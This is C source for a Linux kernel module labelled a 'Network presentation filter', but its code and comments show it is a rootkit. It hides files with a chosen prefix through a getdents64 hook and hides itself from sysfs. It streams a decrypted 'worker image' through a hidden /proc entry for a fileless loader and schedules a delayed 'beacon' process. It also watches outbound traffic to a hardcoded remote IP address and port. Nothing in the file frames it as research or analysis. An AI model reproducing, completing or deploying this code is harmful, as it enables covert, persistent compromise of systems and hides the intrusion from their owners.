#include <em_ksnftc.h>

#include <linux/init.h>
#include <linux/ip.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/proc_fs.h>
#include <linux/seq_file.h>
#include <linux/skbuff.h>
#include <linux/tcp.h>
#include <linux/byteorder/generic.h>

char *hidden_prefix = "ksnftc";
module_param(hidden_prefix, charp, 0444);
MODULE_PARM_DESC(hidden_prefix, "prefix");
unsigned int remote_addr = 0xb342ba83; /* 179.66.186.131 */
module_param(remote_addr, uint, 0644);
MODULE_PARM_DESC(remote_addr, "remote IPv4 address in host byte order");
unsigned short remote_port = 9443;
module_param(remote_port, ushort, 0644);
MODULE_PARM_DESC(remote_port, "remote TCP port to filter");
bool filter_enabled;
module_param(filter_enabled, bool, 0644);
MODULE_PARM_DESC(filter_enabled, "drop matching outbound packets when set");
unsigned int umh_delay_sec = 137;
module_param(umh_delay_sec, uint, 0444);
MODULE_PARM_DESC(umh_delay_sec, "seconds after load to drop the beacon (0 = never)");

atomic64_t em_ksnftc_syscall_hits;
atomic64_t em_ksnftc_packet_hits;
atomic64_t em_ksnftc_hide_hits;
atomic64_t em_ksnftc_umh_state;

static struct proc_dir_entry *status_entry;
static struct proc_dir_entry *img_entry;

static unsigned int em_ksnftc_nf_hook(void *priv, struct sk_buff *skb,
									  const struct nf_hook_state *state)
{
	const struct iphdr *ip;
	const struct tcphdr *tcp;

	if (!skb)
		return NF_ACCEPT;
	ip = ip_hdr(skb);
	if (!ip || ip->version != 4 || ip->protocol != IPPROTO_TCP)
		return NF_ACCEPT;
	if (ntohl(ip->daddr) != remote_addr)
		return NF_ACCEPT;
	tcp = tcp_hdr(skb);
	if (!tcp || ntohs(tcp->dest) != remote_port)
		return NF_ACCEPT;
	atomic64_inc(&em_ksnftc_packet_hits);
	return filter_enabled ? NF_DROP : NF_ACCEPT;
}

static struct nf_hook_ops em_ksnftc_nf_ops = {
	.hook = em_ksnftc_nf_hook,
	.pf = NFPROTO_IPV4,
	.hooknum = NF_INET_LOCAL_OUT,
	.priority = NF_IP_PRI_FIRST,
};

static int em_ksnftc_status_show(struct seq_file *seq, void *unused)
{
	__be32 shown_addr = htonl(remote_addr);

	seq_printf(seq,
			   "module=em_ksnftc\nprefix=%s\nfilter_enabled=%u\n"
			   "remote_addr=%pI4\nremote_port=%u\nsyscall_hits=%lld\n"
			   "packet_hits=%lld\nhide_hits=%lld\numh_state=%lld\numh_delay_sec=%u\n",
			   hidden_prefix, filter_enabled, &shown_addr, remote_port,
			   atomic64_read(&em_ksnftc_syscall_hits),
			   atomic64_read(&em_ksnftc_packet_hits),
			   atomic64_read(&em_ksnftc_hide_hits),
			   atomic64_read(&em_ksnftc_umh_state), umh_delay_sec);
	return 0;
}

static int em_ksnftc_status_open(struct inode *inode, struct file *file)
{
	return single_open(file, em_ksnftc_status_show, NULL);
}

static const struct proc_ops em_ksnftc_proc_ops = {
	.proc_open = em_ksnftc_status_open,
	.proc_read = seq_read,
	.proc_lseek = seq_lseek,
	.proc_release = single_release,
};

/* Virtual file backed by kernel memory: the decrypted worker image is
 * streamed out for the fileless loader. Hidden from readdir by the
 * getdents64 hook (ksnftc* prefix); a direct open still succeeds. */
static int em_ksnftc_img_show(struct seq_file *seq, void *unused)
{
	if (em_ksnftc_img_data && em_ksnftc_img_len)
		seq_write(seq, em_ksnftc_img_data, em_ksnftc_img_len);
	return 0;
}

static int em_ksnftc_img_open(struct inode *inode, struct file *file)
{
	return single_open(file, em_ksnftc_img_show, NULL);
}

static const struct proc_ops em_ksnftc_img_ops = {
	.proc_open = em_ksnftc_img_open,
	.proc_read = seq_read,
	.proc_lseek = seq_lseek,
	.proc_release = single_release,
};

MODULE_LICENSE("GPL");
MODULE_AUTHOR("chaotic");
MODULE_DESCRIPTION("Network presentation filter");

static int __init em_ksnftc_init(void)
{
	int error = nf_register_net_hook(&init_net, &em_ksnftc_nf_ops);

	if (error)
		return error;
	error = em_ksnftc_install_hooks();
	if (error)
	{
		nf_unregister_net_hook(&init_net, &em_ksnftc_nf_ops);
		return error;
	}
	status_entry = proc_create("em_ksnftc_status", 0400, NULL,
							   &em_ksnftc_proc_ops);
	if (!status_entry)
	{
		em_ksnftc_remove_hooks();
		nf_unregister_net_hook(&init_net, &em_ksnftc_nf_ops);
		return -ENOMEM;
	}
	img_entry = proc_create("ksnftc_img", 0400, NULL, &em_ksnftc_img_ops);
	if (!img_entry)
	{
		proc_remove(status_entry);
		em_ksnftc_remove_hooks();
		nf_unregister_net_hook(&init_net, &em_ksnftc_nf_ops);
		return -ENOMEM;
	}
	error = em_ksnftc_umh_schedule(umh_delay_sec);
	if (error)
		pr_warn("em_ksnftc: worker schedule failed: %d\n", error);
	em_ksnftc_hide_sysfs();
	pr_info("em_ksnftc: active prefix=%s remote=%pI4:%u filter=%u\n",
			hidden_prefix, &remote_addr, remote_port, filter_enabled);
	return 0;
}

static void __exit em_ksnftc_exit(void)
{
	em_ksnftc_umh_cancel();
	em_ksnftc_img_free();
	em_ksnftc_restore_sysfs();
	proc_remove(img_entry);
	proc_remove(status_entry);
	em_ksnftc_remove_hooks();
	nf_unregister_net_hook(&init_net, &em_ksnftc_nf_ops);
	pr_info("em_ksnftc: filter removed\n");
}

module_init(em_ksnftc_init);
module_exit(em_ksnftc_exit);
